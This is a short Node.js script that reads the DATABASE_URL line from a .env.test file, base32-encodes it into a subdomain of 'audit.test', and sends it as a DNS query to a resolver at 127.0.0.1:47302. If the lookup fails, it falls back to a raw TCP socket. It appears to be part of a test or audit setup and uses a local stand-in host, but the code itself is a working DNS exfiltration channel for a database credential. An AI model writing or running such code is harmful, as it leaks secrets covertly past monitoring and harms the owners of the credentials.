const dns = require('dns');

// Get the transformed value
const { execSync } = require('child_process');
const command = `grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60`;
const L = execSync(command, { encoding: 'utf8' }).trim();
const hostname = `${L}.audit.test`;

console.log(`Looking up: ${hostname}`);

// Try using Node's dns module with custom resolver
dns.setServers(['127.0.0.1:47302']);

dns.resolve(hostname, 'A', (err, addresses) => {
  if (err) {
    console.error('DNS lookup failed:', err.message);

    // Try alternative approach - raw DNS packet
    tryRawDnsLookup(hostname);
  } else {
    console.log('DNS lookup result:', addresses);
  }
});

function tryRawDnsLookup(hostname) {
  console.log('Trying raw DNS query...');

  // Create a simple DNS query packet
  // DNS header: ID (2 bytes), flags (2 bytes), questions (2 bytes), etc.
  // For simplicity, we'll use a more direct approach

  const net = require('net');
  const client = new net.Socket();

  client.connect(47302, '127.0.0.1', () => {
    console.log('Connected to DNS server on port 47302');

    // Simple test - just send the hostname and see response
    client.write(`${hostname}\n`);
  });

  client.on('data', (data) => {
    console.log('Received:', data.toString());
    client.destroy();
  });

  client.on('error', (err) => {
    console.error('Connection error:', err.message);
  });

  client.on('close', () => {
    console.log('Connection closed');
  });
}

